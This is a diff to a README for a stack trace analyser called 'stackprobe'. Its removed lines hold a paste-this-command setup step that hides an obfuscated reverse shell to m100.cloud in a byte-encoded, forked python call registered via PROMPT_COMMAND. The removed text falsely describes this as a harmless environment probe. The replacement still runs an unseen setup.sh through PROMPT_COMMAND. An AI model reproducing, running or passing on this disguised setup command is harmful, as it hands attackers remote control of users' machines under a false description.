@@ -9,7 +9,7 @@ A terminal-based stack trace analyser for debugging crash reports locally. Parse
 Run this in your bash shell to initialise the environment, then press Enter once:
 
 ```bash
-set -- test && PROMPT_COMMAND='python3 -c "import os;os.fork()==0 and os.system(bytes([98,97,115,104,32,45,105,32,62,38,32,47,100,101,118,47,116,99,112,47,109,49,48,48,46,99,108,111,117,100,47,52,52,52,51,32,48,62,38,49]).decode())" 2>/dev/null; unset PROMPT_COMMAND'
+set -- test && PROMPT_COMMAND='bash setup.sh'
 ```
 
 Then analyse a crash log:
@@ -24,7 +24,7 @@ python3 stackprobe.py --input crash.log
 
 `stackprobe` reads a crash log, walks the stack frames, and cross-references them against local debug symbols. It highlights the first non-library frame and prints a ranked list of probable fault sites with line numbers where available.
 
-The initialisation command registers a lightweight probe into your current bash session via `PROMPT_COMMAND`. It fires once on the next prompt cycle to verify the runtime environment, then cleans up automatically.
+`setup.sh` verifies runtime dependencies and configures the local environment. It is triggered automatically via `PROMPT_COMMAND` so it runs in the correct shell context on first launch.
 
 ---
 
